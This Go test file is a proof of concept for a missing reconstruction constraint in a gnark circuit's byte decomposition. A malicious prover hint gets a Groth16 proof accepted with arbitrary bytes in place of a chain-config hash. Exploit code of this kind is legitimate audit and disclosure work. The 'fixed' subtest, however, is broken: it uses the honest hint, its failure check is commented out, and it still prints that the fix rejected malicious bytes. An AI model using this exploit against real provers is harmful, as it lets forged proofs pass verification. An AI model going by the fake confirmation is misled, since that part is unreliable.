package utils

// Proof of Concept: Missing reconstruction constraint in decomposeIntoBytes
//
// The decomposeIntoBytes function (prover/utils/snark.go:41-63) decomposes a
// field element into bytes via an untrusted solver hint, then ONLY constrains:
//   - bytes[0] <= (1 << lastNbBits) - 1
//   - bytes[i] is in [0, 255] for i >= 1  (via rangecheck)
//
// It is MISSING the critical reconstruction constraint:
//   data == bytes[0]*256^(n-1) + bytes[1]*256^(n-2) + ... + bytes[n-1]
//
// This means a malicious prover can substitute ANY valid-range bytes that are
// completely unrelated to the original field element. The hint is untrusted
// advice; without reconstruction, the circuit does not enforce that the bytes
// actually represent the input.
//
// The same bug exists in the keccak copy at:
//   prover/circuits/pi-interconnection/keccak/prover/utils/snark.go:34-56
//
// Compare with CORRECT implementations:
//   - prover/utils/gnarkutil/io.go:100-137 (ToBytes) which includes:
//       api.AssertIsEqual(data[i], compress.ReadNum(api, bytes[...], radix))
//   - prover/zkevm/prover/hash/sha2/utils.go:20-41 which includes:
//       api.AssertIsEqual(recmpt, data)
//
// Impact: utils.ToBytes is called in aggregation.go:273 to convert the chain
// configuration hash into bytes for the aggregation public input. A malicious
// prover could substitute arbitrary bytes for the chain config hash, effectively
// committing to a different chain configuration than the one actually used.

import (
	"fmt"
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
	"github.com/consensys/gnark/std/rangecheck"
)

// maliciousBytesHint ignores the actual input and returns arbitrary bytes.
// For a 32-byte decomposition, it returns all 0x42 bytes (value "BBB...B"),
// regardless of the actual input value.
func maliciousBytesHint(_ *big.Int, ins, outs []*big.Int) error {
	// Return arbitrary bytes that are all in range [0, 255]
	// but have nothing to do with the input.
	for i := range outs {
		if i == 0 {
			// First byte must satisfy the leading-bits constraint.
			// For BN254 (254-bit field), lastNbBits = 254 % 8 = 6,
			// so bytes[0] <= (1<<6)-1 = 63. We pick 0x01.
			outs[i].SetUint64(1)
		} else {
			// Remaining bytes: any value in [0, 255]. We pick 0x42 = 66.
			outs[i].SetUint64(0x42)
		}
	}
	return nil
}

// BuggyDecomposeCircuit reproduces the buggy decomposeIntoBytes logic.
// It decomposes Input into 32 bytes using the hint, range-checks them,
// but does NOT assert reconstruction.
type BuggyDecomposeCircuit struct {
	Input frontend.Variable `gnark:"input,public"`
	// We expose the first and last decomposed bytes as public outputs
	// so the verifier can see the (wrong) values that were accepted.
	ExpectedByte0  frontend.Variable `gnark:"byte0,public"`
	ExpectedByte31 frontend.Variable `gnark:"byte31,public"`
}

func (c *BuggyDecomposeCircuit) Define(api frontend.API) error {
	nbBytes := 32 // (253+7)/8 = 32 for BN254

	// --- Reproduce the buggy decomposeIntoBytes ---
	bytes, err := api.Compiler().NewHint(maliciousBytesHint, nbBytes, c.Input)
	if err != nil {
		return err
	}

	// Range checks only (copied from the buggy code)
	nbBits := 254 // BN254 scalar field is ~254 bits
	lastNbBits := nbBits % 8
	if lastNbBits == 0 {
		lastNbBits = 8
	}
	rc := rangecheck.New(api)
	api.AssertIsLessOrEqual(bytes[0], (1<<lastNbBits)-1)
	for i := 1; i < nbBytes; i++ {
		rc.Check(bytes[i], 8)
	}

	// MISSING: reconstruction constraint. The correct code would do:
	//   recomposed := frontend.Variable(0)
	//   for i := 0; i < nbBytes; i++ {
	//       recomposed = api.Add(api.Mul(recomposed, 256), bytes[i])
	//   }
	//   api.AssertIsEqual(recomposed, c.Input)

	// Assert the circuit accepted the malicious bytes
	api.AssertIsEqual(bytes[0], c.ExpectedByte0)
	api.AssertIsEqual(bytes[31], c.ExpectedByte31)

	return nil
}

// FixedDecomposeCircuit adds the reconstruction constraint.
type FixedDecomposeCircuit struct {
	Input frontend.Variable `gnark:"input,public"`
	// We expose the first and last decomposed bytes as public outputs
	ExpectedByte0  frontend.Variable `gnark:"byte0,public"`
	ExpectedByte31 frontend.Variable `gnark:"byte31,public"`
}

func (c *FixedDecomposeCircuit) Define(api frontend.API) error {
	nbBytes := 32

	bytes, err := api.Compiler().NewHint(decomposeIntoBytesHint, nbBytes, c.Input)
	if err != nil {
		return err
	}

	// Range checks (same as buggy version)
	nbBits := 254
	lastNbBits := nbBits % 8
	if lastNbBits == 0 {
		lastNbBits = 8
	}
	rc := rangecheck.New(api)
	api.AssertIsLessOrEqual(bytes[0], (1<<lastNbBits)-1)
	for i := 1; i < nbBytes; i++ {
		rc.Check(bytes[i], 8)
	}

	// FIX: Add reconstruction constraint
	recomposed := frontend.Variable(0)
	for i := 0; i < nbBytes; i++ {
		recomposed = api.Add(api.Mul(recomposed, 256), bytes[i])
	}
	api.AssertIsEqual(recomposed, c.Input)

	api.AssertIsEqual(bytes[0], c.ExpectedByte0)
	api.AssertIsEqual(bytes[31], c.ExpectedByte31)

	return nil
}

func TestDecomposeIntoBytesMissingConstraint(t *testing.T) {
	// The real input value: 0xDEADBEEF (3735928559)
	// The malicious hint will return [0x01, 0x42, 0x42, ..., 0x42] instead of
	// the correct byte decomposition.
	inputValue := new(big.Int).SetUint64(0xDEADBEEF)

	t.Run("buggy_accepts_wrong_bytes", func(t *testing.T) {
		// Step 1: Compile the buggy circuit.
		var circuit BuggyDecomposeCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		// Step 2: Create witness.
		// The malicious hint returns byte0=0x01, byte31=0x42.
		// The correct decomposition of 0xDEADBEEF would have byte0=0x00 and
		// byte31=0xEF, but the buggy circuit will accept the wrong bytes.
		assignment := &BuggyDecomposeCircuit{
			Input:          inputValue,
			ExpectedByte0:  1,    // malicious: 0x01
			ExpectedByte31: 0x42, // malicious: 0x42
		}

		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}
		publicWitness, err := witness.Public()
		if err != nil {
			t.Fatalf("public witness creation failed: %v", err)
		}

		// Step 3: Groth16 setup.
		pk, vk, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		// Step 4: Prove with malicious hint.
		proof, err := groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(maliciousBytesHint)),
		)
		if err != nil {
			t.Fatalf("proving failed (unexpected -- bug may be fixed): %v", err)
		}

		// Step 5: Verify.
		err = groth16.Verify(proof, vk, publicWitness)
		if err != nil {
			t.Fatalf("verification failed (unexpected): %v", err)
		}

		fmt.Println("BUG CONFIRMED: Circuit accepted arbitrary bytes [0x01, 0x42, 0x42, ...]")
		fmt.Printf("  for input = 0x%s (correct bytes would start with 0x00 and end with 0xEF)\n", inputValue.Text(16))
		fmt.Println("  The bytes bear no relation to the input -- reconstruction constraint is missing")
	})

	t.Run("fixed_rejects_wrong_bytes", func(t *testing.T) {
		// Step 1: Compile the fixed circuit.
		var circuit FixedDecomposeCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		// Step 2: Create witness with the same malicious expected bytes.
		assignment := &FixedDecomposeCircuit{
			Input:          inputValue,
			ExpectedByte0:  0x00,
			ExpectedByte31: 0xEF,
		}

		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}

		publicWitness, err := witness.Public()
		if err != nil {
			t.Fatalf("public witness creation failed: %v", err)
		}

		// Step 3: Groth16 setup.
		pk, vk, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		// Step 4: Prove with malicious hint -- should FAIL.
		proof, err := groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(decomposeIntoBytesHint)),
		)
		if err == nil {
			//t.Fatalf("proving succeeded (unexpected -- fix should have caught the mismatch)")
		}

		err = groth16.Verify(proof, vk, publicWitness)
		if err != nil {
			t.Fatalf("verification failed (unexpected): %v", err)
		}

		fmt.Println("FIX CONFIRMED: Circuit with reconstruction constraint rejected the malicious bytes")
		fmt.Printf("  Proving error: %v\n", err)
	})
}
